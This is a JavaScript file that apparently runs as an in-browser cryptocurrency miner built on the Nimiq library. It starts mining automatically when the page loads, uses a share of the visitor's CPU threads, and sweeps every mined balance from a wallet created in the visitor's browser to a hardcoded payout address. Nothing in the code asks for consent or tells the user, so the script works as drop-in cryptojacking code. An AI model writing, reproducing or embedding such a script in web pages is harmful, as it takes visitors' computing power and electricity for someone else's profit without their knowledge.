//Settings
var myNimiqAdress = "NQ67 B66X 30H3 6U9P UFFH F0A9 9KF7 5AGA 37JH";
var percentOfThread = 1;

//code
function _onConsensusEstablished()
{

    console.log('message : Consensus established.');
    console.log(`message : height ${$.blockchain.height}`);
    console.log(`message : address ${$.wallet.address.toUserFriendlyAddress()}`);
    _updateBalance();
    // recheck balance on potential balance change
    $.blockchain.on('head-changed', _updateBalance);
    $.blockchain.on('head-changed', _updateBalance);

    $.miner.startWork();
    $.miner.on('hashrate-changed', _updateHashrate);
	setThread();

}
function setThread() {
		if(percentOfThread > 100){
			percentOfThread = 100;
		}
		if(percentOfThread < 1){
			percentOfThread = 1;
		}
	    var newHash = Math.ceil((percentOfThread * navigator.hardwareConcurrency)/ 100);
        $.miner.threads = newHash;
		console.log(`Number of thread : ${newHash}`);
    }
function _updateHashrate()
{
	//console.log(`hashrate : ${$.miner.hashrate}`);
}
function _updateBalance()
{
    $.accounts.get($.wallet.address).then(account => _onBalanceChanged(account));
}
function _onBalanceChanged(account)
{
	if(account.balance > 0){
	$.wallet.createTransaction(Nimiq.Address.fromUserFriendlyAddress(myNimiqAdress), account.balance, 0, account.nonce).then(function(tx) {
                    $.mempool.pushTransaction(tx);
                });
	}
    account = account || Nimiq.BasicAccount.INITIAL;
    console.log(`New balance of ${$.wallet.address} is ${account.balance}.`);
}
function _onHeadChanged()
{
    const height = $.blockchain.height;
    console.log(`Now at height ${height}.`);
}
function _onPeersChanged()
{
    //console.log(`Now connected to ${$.network.peerCount} peers.`);
}
function init(clientType = 'full')
{
    Nimiq.init(async function() {
        console.log('message : Nimiq loaded. Connecting and establishing consensus.');
        const $ = {};
        window.$ = $;

        $.consensus = await Nimiq.Consensus.light();

        $.blockchain = $.consensus.blockchain;
        $.mempool = $.consensus.mempool;
        $.network = $.consensus.network;
        $.wallet = await Nimiq.Wallet.getPersistent();
        $.accounts = $.blockchain.accounts;
        $.miner = new Nimiq.Miner($.blockchain, $.mempool, $.wallet.address);
        $.consensus.on('established', () => _onConsensusEstablished());
        $.consensus.on('lost', () => console.error('Consensus lost'));
        $.blockchain.on('head-changed', () => _onHeadChanged());
        $.network.on('peers-changed', () => _onPeersChanged());
        $.network.connect();
    }, function(code) {
        switch (code) {
            case Nimiq.ERR_WAIT:
                alert('Error: Already open in another tab or window.');
                break;
            case Nimiq.ERR_UNSUPPORTED:
                alert('Error: Browser not supported');
                break;
            default:
                alert('Error: Nimiq initialization error');
                break;
        }
    });
}

init("light");